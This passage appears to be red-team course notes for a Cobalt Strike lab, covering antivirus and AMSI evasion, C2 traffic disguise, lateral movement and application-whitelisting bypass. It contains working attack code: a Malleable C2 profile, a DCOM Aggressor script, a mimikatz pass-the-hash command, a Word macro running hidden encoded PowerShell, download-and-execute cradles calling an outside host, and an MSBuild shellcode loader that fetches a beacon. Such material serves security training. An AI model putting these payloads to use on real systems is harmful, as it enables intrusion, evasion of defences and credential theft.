The first is to search for a specific byte sequence output by ThreatCheck, for example C1 83 E1 07 8A 0C 0A 41 30 0C 01 48 FF C0 EB E9.  Go to Search > Memory, paste the string into the search box and click Search All.

The other method is to use the "bad bytes offset" as given by ThreatCheck.  Select Navigation > Go To and enter file(n) where n is the offset.  In this case it would be file(0xBEC).

Change for loop, line 45, in **patch.c** in **src-common** folder to:
```
for (x = 0; x < length; x++) {
    char* ptr = (char *)buffer + x;

    /* do something random */
    GetTickCount();

    *ptr = *ptr ^ key[x % 8];
}
```

Change pipe name in **bypass-pipe.c**:
```
sprintf(pipename, "%c%c%c%c%c%c%c%c%crasta\\mouse", 92, 92, 46, 92, 112, 105, 112, 101, 92);
```

Build.

Delete payloads an re-generate them.
## Resource kit
Scan with ThreatCheck and use **-e amsi** flag.

Replace var in the for loop in your generated smb_x64.ps1 payload:
```
for ($i = 0; $i -lt $enc.Count; $i++) {
    $enc[$i] = $enc[$i] -bxor 35
}
```

Host the smb_x64.ps1 payload instead of using scripted web delivery, because the Gzip stream (compress.ps1) is detected.

Or edit the **template.x64.ps1**, and build it:
```
./build.sh /mnt/c/Tools/cobaltstrike/resources
```
## Profile
[webbug](https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/webbug.profile)

Profile changes:
```
set sleeptime "1";
set tasks_max_size "2097152";

stage {
	set userwx "false";
	set cleanup "true";
	set obfuscate "true";
	set module_x64 "xpsservices.dll";
}

http-get {
	set uri "/__utm.gif";
	client {
		parameter "utmac" "UA-2202604-2";
		parameter "utmcn" "1";
		parameter "utmcs" "ISO-8859-1";
		parameter "utmsr" "1280x1024";
		parameter "utmsc" "32-bit";
		parameter "utmul" "en-US";

		metadata {
			netbios;
			prepend "__utma";
			parameter "utmcc";
		}
	}

	server {
		header "Content-Type" "image/gif";

		output {
			# hexdump pixel.gif
			# 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
			# 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
			# 0000020 01 00 01 00 00 02 01 44 00 3b 

			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

			print;
		}
	}
}

http-post {
	set uri "/___utm.gif";
	client {
		header "Content-Type" "application/octet-stream";

		id {
			prepend "UA-220";
			append "-2";
			parameter "utmac";
		}

		parameter "utmcn" "1";
		parameter "utmcs" "ISO-8859-1";
		parameter "utmsr" "1280x1024";
		parameter "utmsc" "32-bit";
		parameter "utmul" "en-US";

		output {
			print;
		}
	}

	server {
		header "Content-Type" "image/gif";

		output {
			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
			print;
		}
	}
}

# dress up the staging process too
http-stager {
	server {
		header "Content-Type" "image/gif";
	}
}

post-ex {
	set amsi_disable "true";
	set spawnto_x64 "c:\\windows\\sysnative\\dllhost.exe";
	set spawnto_x86 "c:\\windows\\syswow64\\dllhost.exe";
}
```

**amsi_disable** only applies to **powerpick**, **execute-assembly** and **psinject**.  It does not apply to the **powershell** command.

In some cases for moving laterally with psexec, set the spawnto:
```
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
```
## Agressor
### DCOM
Create **dcom.cna**:
```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```
### Mimikatz
```
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/mimikatz
./build.sh /mnt/c/Tools/cobaltstrike/mimikatz
```

If defender catches **pth** command use:
```
mimikatz sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:notepad.exe
steal_token 17896
```
## Word macros
Spawning a hidden PowerShell process using ShellWindows:
```
Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
Set obj = shellWindows.Item()
obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACIAKQA=", Null, Null, 0
```
## AMSI bypass
See **amsi/amsibypasshwbp.ps1** in this repo.

We could save this off to a new file and host it at a different URI on the team server.  Then just call and invoke this bypass script before the payload.

```
iex (new-object net.webclient).downloadstring("http://nickelviper.com/bypass"); iex (new-object net.webclient).downloadstring("http://nickelviper.com/a")
```
## Enable defender
Defender is disabled via GPO, which you can see by opening Group Management Console (GPMC) on Domain Controller 2 (dc-2.dev.cyberbotic.io).  The GPO is simply called "Windows Defender" and is linked to the Domain Controllers, SQL Servers, Web Servers and Workstations OU.

To re-enable Defender on a group of the machines, simply disable the GPO link on the corresponding OU by right-clicking on the GPO and unchecking "Link Enabled".

You can wait for the natural group policy refresh cycle; or log into the console of each machine and manually run **gpupdate** from a command prompt and then reboot each machine.

Defender should be enabled on the next boot.  If see this error message inside the Windows Security settings, click Restart now and reboot again.

To test AMSI, use the AMSI Test Sample PowerShell cmdlet.
```
Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
```

To test on-disk detections, drop the EICAR test file somewhere such as the desktop.
```
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```
# Application whitelisting
## Policy enumeration
Find registry and parse with Parse-PolFile:
```
powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath

download \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol
```

If on a local machine, you can query the registry at **HKLM:Software\\Policies\\Microsoft\\Windows\\SrpV2** to obtain the same:
```
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
```

Check language mode:
```
$ExecutionContext.SessionState.LanguageMode
```
## Writeable paths
The default rules allow execution from anywhere within **C:\\Program Files** and **C:\\Windows (including subdirectories)**.  Moving laterally to a protected machine via **psexec** is trivial, because the service executable is written into **C:\\Windows**.
```
jump psexec64 dc.dev-studio.com smb
```

Usually a writeable folder is **C:\\Windows\\Tasks**:
```
powershell Get-Acl C:\Windows\Tasks | fl
```

Weak rule:
```
<FilePathCondition Path="*\AppV\*"/>
```
## LOLBAS
[LOLBAS](https://lolbas-project.github.io/)

We use [Msbuild](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/) as a demo, if not blocked, it can be used to execute arbitrary **C#** code from a **.csproj** or **.xml** file:
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest : Task, ITask
            {
                public override bool Execute()
                {
                    Console.WriteLine("Hello World");
                    return true;
                }
            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

As shellcode injector:
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "http://nickelviper.com";
                        shellcode = client.DownloadData("beacon.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```
You can use **http_x64.xprocess.bin** here and host it on the Cobalt Strike Team Server via Site Management > Host File.
## Powershell CLM
Check CLM:
```
powershell $ExecutionContext.SessionState.LanguageMode
powerpick $ExecutionContext.SessionState.LanguageMode
```

Powershell command with **Msbuild**:
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
     <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Linq;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;

            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    using (var runspace = RunspaceFactory.CreateRunspace())
                    {
                      runspace.Open();

                      using (var posh = PowerShell.Create())
                      {
                        posh.Runspace = runspace;
                        posh.AddScript("$ExecutionContext.SessionState.LanguageMode");
                                                
                        var results = posh.Invoke();
                        var output = string.Join(Environment.NewLine, results.Select(r => r.ToString()).ToArray());
                        
                        Console.WriteLine(output);
                      }
                    }

                return true;
              }
            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```
## Beacon DLL
Beacon's DLL payload exposes several exports including **DllMain** and **StartW**.  These can be changed in the **Artifact Kit** under **src-main**, **dllmain.def**:
```
C:\Windows\System32\rundll32.exe http_x64.dll,StartW
```
